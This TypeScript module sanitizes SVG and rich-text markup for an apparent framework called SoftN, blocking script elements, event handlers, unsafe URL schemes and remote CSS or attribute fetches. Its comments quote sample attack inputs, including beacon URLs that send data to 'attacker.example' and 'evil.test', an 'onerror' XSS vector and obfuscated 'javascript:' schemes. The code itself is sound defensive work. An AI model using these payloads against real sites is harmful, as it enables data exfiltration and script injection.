/**
 * HTML sanitization for the few places SoftN injects markup directly.
 *
 * The renderer refuses to emit `<script>`, `<iframe>` and friends from `.ui`
 * markup, but two components take a string and hand it straight to the DOM:
 * `<Icon svg={…}>` and `<RichTextEditor value={…}>`. Both accept whatever a
 * bundle passes — typically a value read from XDB or arriving over sync — which
 * routed around the tag denylist entirely.
 *
 * Parsing rather than pattern-matching is deliberate. Every regex-based HTML
 * filter eventually loses to a case the author did not picture; the browser's
 * own parser sees exactly what the browser will later execute.
 */

/**
 * Schemes a URL-bearing attribute may use.
 *
 * Anything with no scheme — `/page`, `./img.png`, `#top`, `?q=1` — is relative
 * to the host document and always allowed. `blob:` is needed because `asset()`
 * hands out object URLs, and `data:` is restricted to media because bundles
 * legitimately inline images and audio while `data:text/html` carries script.
 */
const SAFE_URL_SCHEMES = new Set(['http:', 'https:', 'mailto:', 'tel:', 'sms:', 'blob:']);
const SAFE_DATA_URL = /^data:(?:image|audio|video|font)\//i;

/**
 * Characters a browser strips before resolving a scheme. Leaving them in means
 * `java\tscript:` and `  javascript:` slip past a naive prefix check.
 *
 * Matching control characters is the entire purpose here — a NUL or tab inside
 * `java\0script:` is exactly the case this has to catch — so the lint rule that
 * normally flags them as a typo does not apply.
 */
// eslint-disable-next-line no-control-regex
const URL_IGNORED = /[\u0000-\u0020\u00a0\u1680\u2000-\u200f\u2028\u2029\u202f\u205f\u3000\ufeff]/g;

/** Whether a URL is safe to hand to the DOM. */
export function isSafeUrl(value: string): boolean {
  const probe = value.replace(URL_IGNORED, '');
  const scheme = /^([a-zA-Z][a-zA-Z0-9+.-]*):/.exec(probe);
  if (!scheme) return true; // relative, fragment, or query — same origin
  if (SAFE_DATA_URL.test(probe)) return true;
  return SAFE_URL_SCHEMES.has(scheme[1].toLowerCase() + ':');
}

/**
 * Whether a URL makes the browser talk to a host other than the one serving
 * the page — the question `isSafeUrl` does not ask.
 *
 * `isSafeUrl` judges the scheme: `https://attacker.example/beacon?secret=1` is
 * a perfectly safe scheme and it is also a GET to somebody else's server, so a
 * bundle's own markup reached the network on first paint with no capability
 * involved. Answering "is this egress" separately is what lets the renderer
 * hold remote sources back while the consent bar is unanswered and let them
 * through once the user allows.
 *
 * Backslashes are folded to slashes before the protocol-relative test. The URL
 * parser does the same for the http(s) base a bundle runs under, so `\\host/x`
 * and `/\host/x` both resolve to `http://host/x` — a protocol-relative URL
 * spelled so that a leading-`//` check misses it.
 *
 * A same-origin absolute URL (`https://this-host/x`) answers true as well.
 * Withholding it costs nothing: it loads the moment the user allows, and the
 * alternative is comparing against an origin this module cannot see.
 */
export function isRemoteUrl(value: string): boolean {
  const probe = value.replace(URL_IGNORED, '').replace(/\\/g, '/');
  if (probe.startsWith('//')) return true; // protocol-relative
  const scheme = /^([a-zA-Z][a-zA-Z0-9+.-]*):/.exec(probe);
  if (!scheme) return false; // relative, fragment, or query — this origin
  return REMOTE_URL_SCHEMES.has(scheme[1].toLowerCase());
}

/**
 * Schemes that name a host to connect to. `data:` and `blob:` are excluded on
 * purpose: they carry their bytes with them, and `asset()` hands bundle files
 * out as `blob:`, so treating them as egress would break every bundle's own
 * sounds and images for no gain.
 */
const REMOTE_URL_SCHEMES = new Set(['http', 'https', 'ftp', 'ftps', 'ws', 'wss']);

/**
 * True if any candidate in a `srcset` is remote.
 *
 * `srcset` is a comma-separated list — `a.png 1x, https://host/b.png 2x` — so
 * asking `isRemoteUrl` about the whole string answers about the first URL and
 * the browser fetches whichever one it prefers.
 */
export function hasRemoteSrcSetCandidate(value: string): boolean {
  return value
    .split(',')
    .some((candidate) => isRemoteUrl(candidate.trim().split(/\s+/)[0] ?? ''));
}

/**
 * The CSS functions that make the browser fetch something.
 *
 * `url()` is the one everybody checks. `image-set()`, `image()`, `src()` and
 * `cross-fade()` take their targets as plain strings — `image-set("https://…"
 * 1x)` reaches the network with no `url(` anywhere in it — so a check that
 * looks for `url(` alone lets those through. The names are matched on a
 * lowercased copy, because `URL(` is `url(` to the browser, and with no
 * word boundary in front: `@importurl(…)` is nothing to the browser, but
 * a check that let it through would be one guess about the parser away
 * from being wrong, and removing it costs nothing.
 */
const CSS_RESOURCE_FUNCTION =
  /(-webkit-image-set|-webkit-cross-fade|image-set|cross-fade|image|url|src)\s*\(/g;

/** ASCII-only lowercasing: the same length as its input, so indices carry over. */
function lowerAscii(text: string): string {
  return text.replace(/[A-Z]/g, (c) => c.toLowerCase());
}

/**
 * The index of the `)` that closes the function whose `(` is at `open`,
 * honouring quotes and nesting; -1 if it never closes. A single pattern with
 * `[^)]*` cannot cross a literal `)`, so a URL that contains one inside its
 * quotes — `url("https://evil.test/beacon?a=(b)")`, a perfectly ordinary query
 * string — failed to match and the declaration reached the page untouched.
 */
function closeOfCssFunction(text: string, open: number): number {
  let depth = 0;
  let quote: string | null = null;
  for (let i = open; i < text.length; i++) {
    const ch = text[i];
    if (quote) {
      if (ch === '\\') i++;
      else if (ch === quote) quote = null;
      continue;
    }
    if (ch === '"' || ch === "'") quote = ch;
    else if (ch === '(') depth++;
    else if (ch === ')' && --depth === 0) return i;
  }
  return -1;
}

/**
 * `\75rl(` is `url(`: the browser undoes CSS escapes before it reads a
 * function name or a scheme, so anything judging either has to as well.
 */
export function decodeCssEscapes(text: string): string {
  return text.replace(
    /\\(?:([0-9a-fA-F]{1,6})[ \t\n\f\r]?|([\s\S]))/g,
    (_match, hex: string | undefined, ch: string | undefined) => {
      if (hex !== undefined) {
        const cp = parseInt(hex, 16);
        return cp === 0 || cp > 0x10ffff ? '�' : String.fromCodePoint(cp);
      }
      return ch ?? '';
    }
  );
}

/** The quoted strings in a run of CSS, unquoted, with their escapes undone. */
function cssStringsIn(text: string): string[] {
  const out: string[] = [];
  const pattern = /"((?:[^"\\]|\\[\s\S])*)"|'((?:[^'\\]|\\[\s\S])*)'/g;
  let m: RegExpExecArray | null;
  while ((m = pattern.exec(text))) out.push(decodeCssEscapes(m[1] ?? m[2] ?? ''));
  return out;
}

/** The target of one `url(...)`: the string inside its quotes, or the bare token. */
function urlTarget(inner: string): string {
  const trimmed = inner.trim();
  const quoted = /^(["'])([\s\S]*)\1$/.exec(trimmed);
  return quoted ? quoted[2] : trimmed;
}

/** What a run of CSS would make the browser fetch. */
export interface CssResourceScan {
  /** Every target found: `url()` arguments, and the strings inside the image functions. */
  urls: string[];
  /**
   * The CSS carried a resource-bearing form this scan could not read to a
   * URL — an escape sequence, a function that never closes. Nothing an inline
   * style legitimately says needs either, so a caller withholds rather than
   * guesses.
   */
  opaque: boolean;
}

/**
 * Every resource a declaration or an inline style would load.
 *
 * Comments are dropped and escapes undone first, because both are ways of
 * spelling `url(https://…)` so that a search for that text does not find it:
 * an empty comment in the middle of the name and `\75rl(` are both `url(`
 * once the browser has read them.
 */
export function cssResourceReferences(value: string): CssResourceScan {
  const stripped = value.replace(/\/\*[\s\S]*?\*\//g, '');
  const decoded = decodeCssEscapes(stripped);
  // An escape next to a function call could be hiding the function's name;
  // an escape in a value with no call at all — `content: "\201C"` — cannot,
  // and is left to mean what it says.
  const scan: CssResourceScan = {
    urls: [],
    opaque: decoded !== stripped && decoded.includes('('),
  };
  const lower = lowerAscii(decoded);
  const pattern = new RegExp(CSS_RESOURCE_FUNCTION.source, 'g');
  let m: RegExpExecArray | null;
  while ((m = pattern.exec(lower))) {
    const name = m[1];
    const open = m.index + m[0].length - 1;
    const close = closeOfCssFunction(lower, open);
    if (close < 0) {
      scan.opaque = true;
      break;
    }
    const inner = decoded.slice(open + 1, close);
    if (name === 'url') scan.urls.push(urlTarget(inner));
    else scan.urls.push(...cssStringsIn(inner));
    // Carry on inside the function: `image-set(url(…) 1x)` nests one.
    pattern.lastIndex = open + 1;
  }
  return scan;
}

/**
 * Rewrite the resource functions whose target a predicate rejects, leaving
 * the rest of the CSS alone. A rejected `url()` becomes a `url()` of a
 * "removed" comment, as it always did; a rejected `image-set()`, `image()`, `src()` or
 * `cross-fade()` becomes `none`, which every property that takes them accepts.
 *
 * This works on the text as given — a caller that wants escapes judged
 * decodes or neuters them first, as `sanitizeBundleCSS` does — and matches
 * function names regardless of case.
 */
export function rewriteCssResources(css: string, isBlocked: (target: string) => boolean): string {
  const lower = lowerAscii(css);
  const pattern = new RegExp(CSS_RESOURCE_FUNCTION.source, 'g');
  let out = '';
  let last = 0;
  let m: RegExpExecArray | null;
  while ((m = pattern.exec(lower))) {
    const name = m[1];
    const start = m.index;
    const open = m.index + m[0].length - 1;
    const removed = name === 'url' ? 'url(/* removed */)' : 'none';
    const close = closeOfCssFunction(lower, open);
    if (close < 0) {
      // Never closes: whatever follows was meant as its argument.
      out += css.slice(last, start) + removed;
      last = css.length;
      break;
    }
    const inner = css.slice(open + 1, close);
    const targets = name === 'url' ? [urlTarget(inner)] : cssStringsIn(inner);
    if (targets.some(isBlocked)) {
      out += css.slice(last, start) + removed;
      last = close + 1;
      pattern.lastIndex = close + 1;
    } else {
      pattern.lastIndex = open + 1;
    }
  }
  return out + css.slice(last);
}

/** The earlier name of {@link rewriteCssResources}, kept for callers that have it. */
export const rewriteCssUrls = rewriteCssResources;

/**
 * A caller's verdict on a URL the markup would fetch or follow: true keeps
 * it, false removes it. `attribute` is the lowercased attribute name and
 * `tag` the element's, so a judge can treat a link the user chooses to follow
 * (`href` on an `<a>`) differently from a fetch the render performs (`src`,
 * `srcset`, or `href` on an SVG `<use>`). Without a judge the only test is
 * the scheme; `markupUrlJudge` in egress-policy.ts is the one that applies
 * the bundle's network permission.
 */
export type MarkupUrlJudge = (url: string, attribute: string, tag: string) => boolean;

/** Attributes whose value the browser will fetch or navigate to. */
export const URL_ATTRIBUTES = new Set([
  'href',
  'src',
  'srcset',
  'action',
  'formaction',
  'poster',
  'cite',
  'data',
  'ping',
  'background',
  'xlink:href',
]);

/** SVG elements that only describe shapes — no scripting, no external loads. */
const SVG_TAGS = new Set([
  'svg',
  'g',
  'defs',
  'symbol',
  'use',
  'title',
  'desc',
  'path',
  'rect',
  'circle',
  'ellipse',
  'line',
  'polyline',
  'polygon',
  'text',
  'tspan',
  'textpath',
  'marker',
  'mask',
  'clippath',
  'pattern',
  'lineargradient',
  'radialgradient',
  'stop',
  'filter',
  'fegaussianblur',
  'feoffset',
  'feblend',
  'femerge',
  'femergenode',
  'fecolormatrix',
  'fedropshadow',
  'fecomposite',
  'feflood',
]);

/** Inline formatting a rich-text value may contain. */
const RICH_TEXT_TAGS = new Set([
  'p',
  'br',
  'div',
  'span',
  'b',
  'strong',
  'i',
  'em',
  'u',
  's',
  'strike',
  'del',
  'ins',
  'sub',
  'sup',
  'mark',
  'small',
  'code',
  'pre',
  'blockquote',
  'ul',
  'ol',
  'li',
  'dl',
  'dt',
  'dd',
  'h1',
  'h2',
  'h3',
  'h4',
  'h5',
  'h6',
  'a',
  'img',
  'hr',
  'table',
  'thead',
  'tbody',
  'tfoot',
  'tr',
  'th',
  'td',
  'caption',
  'font',
]);

/**
 * Where a URL the judge withheld waits: `data-softn-withheld-src` for a
 * `src`, and so on. Prefixed with `data-` so the browser fetches nothing from
 * it, and named so a later pass can put it back.
 */
const WITHHELD_PREFIX = 'data-softn-withheld-';

/**
 * Strip everything outside `allowed` from a fragment of markup.
 *
 * A disallowed element is unwrapped rather than deleted — its text survives, so
 * a stray `<div>` in an icon does not silently swallow the label inside it —
 * except for elements that carry executable content, which are removed whole.
 */
function sanitizeFragment(markup: string, allowed: Set<string>, judge?: MarkupUrlJudge): string {
  // No DOM (server render, worker). Refusing is the safe answer: the value is
  // untrusted and there is nothing here to check it with.
  if (typeof DOMParser === 'undefined') return '';

  const doc = new DOMParser().parseFromString(`<body>${markup}</body>`, 'text/html');
  const body = doc.body;

  // Elements whose *content* is code or data rather than text, so unwrapping
  // them would paste that content into the document as markup.
  const DROP_WHOLE = new Set(['script', 'style', 'iframe', 'object', 'embed', 'template', 'link']);

  const walk = (node: Element): void => {
    // Snapshot first: the loop reparents and removes nodes as it goes.
    for (const child of Array.from(node.children)) walk(child);

    const tag = node.tagName.toLowerCase();

    if (DROP_WHOLE.has(tag)) {
      node.remove();
      return;
    }

    if (!allowed.has(tag)) {
      // Unwrap: keep the children, drop the element itself.
      const parent = node.parentNode;
      if (parent) {
        while (node.firstChild) parent.insertBefore(node.firstChild, node);
        parent.removeChild(node);
      }
      return;
    }

    for (const attr of Array.from(node.attributes)) {
      const name = attr.name.toLowerCase();

      // Event handlers, in any spelling the parser accepts.
      if (name.startsWith('on')) {
        node.removeAttribute(attr.name);
        continue;
      }
      // `<svg>` accepts a nested browsing context through these.
      if (name === 'xmlns:xlink' && attr.value.includes('script')) {
        node.removeAttribute(attr.name);
        continue;
      }
      // A scheme that executes is never kept. A scheme that is safe — https,
      // most of all — is still a fetch of somebody else's server, and whether
      // the app may make it is the judge's question, the same one the
      // renderer asks of a `src` prop: an XSS filter and an egress policy
      // solve different problems, and this used to apply only the first.
      if (URL_ATTRIBUTES.has(name)) {
        if (!isSafeUrl(attr.value)) {
          node.removeAttribute(attr.name);
          continue;
        }
        if (judge && !judge(attr.value, name, tag)) {
          // Withheld, not forgotten. A rich-text editor reads its value back
          // out of this DOM, so a URL simply removed here would be gone from
          // what the app saves the moment the person typed — and would not
          // come back when they pressed Allow. It waits on a data attribute
          // the browser does not fetch, and is put back below once the judge
          // lets it through.
          node.setAttribute(WITHHELD_PREFIX + name, attr.value);
          node.removeAttribute(attr.name);
          continue;
        }
      }
      // `style` can load remote resources, which is a beacon — through
      // `url()`, through `image-set("…")`, or through either spelled with
      // escapes. Rich text has no legitimate use for any of them.
      if (name === 'style') {
        const scan = cssResourceReferences(attr.value);
        if (scan.opaque || scan.urls.length > 0) node.removeAttribute(attr.name);
      }
    }

    // A URL withheld earlier — by this pass, or by an earlier sanitization
    // whose output is now the value — goes back on its attribute once the
    // judge allows it, and stays waiting while it does not. Nothing on a
    // withheld attribute is trusted further than the attribute it came from:
    // it is judged exactly as if it had arrived there.
    for (const attr of Array.from(node.attributes)) {
      const name = attr.name.toLowerCase();
      if (!name.startsWith(WITHHELD_PREFIX)) continue;
      const original = name.slice(WITHHELD_PREFIX.length);
      if (!URL_ATTRIBUTES.has(original) || !isSafeUrl(attr.value)) {
        node.removeAttribute(attr.name);
        continue;
      }
      if (node.hasAttribute(original)) {
        // The element has a live value for this attribute already; the
        // stash is stale and must not write over it.
        node.removeAttribute(attr.name);
        continue;
      }
      if (!judge || judge(attr.value, original, tag)) {
        node.setAttribute(original, attr.value);
        node.removeAttribute(attr.name);
      }
    }
  };

  for (const child of Array.from(body.children)) walk(child);
  return body.innerHTML;
}

/**
 * Restrict markup to inert SVG.
 *
 * `<Icon svg={record.body} />` used to inject its argument verbatim, so a
 * record containing `<img src=x onerror=…>` executed on the host origin.
 * With a judge, a `<use href>` or `xlink:href` that points off the page is
 * held to the bundle's network permission as well.
 */
export function sanitizeSvg(markup: string, judge?: MarkupUrlJudge): string {
  return sanitizeFragment(markup, SVG_TAGS, judge);
}

/**
 * Restrict markup to inert rich text.
 *
 * With a judge, an `<img src>`, `srcset`, `poster` or the like that points
 * off the page is held to the bundle's network permission — withheld while
 * the consent bar is unanswered, and refused outright by a bundle that
 * declares no `net` or one that scopes itself to other hosts. A link's `href`
 * is navigation the user chooses, and is only withheld while consent is
 * pending, as in the renderer.
 */
export function sanitizeRichText(markup: string, judge?: MarkupUrlJudge): string {
  return sanitizeFragment(markup, RICH_TEXT_TAGS, judge);
}
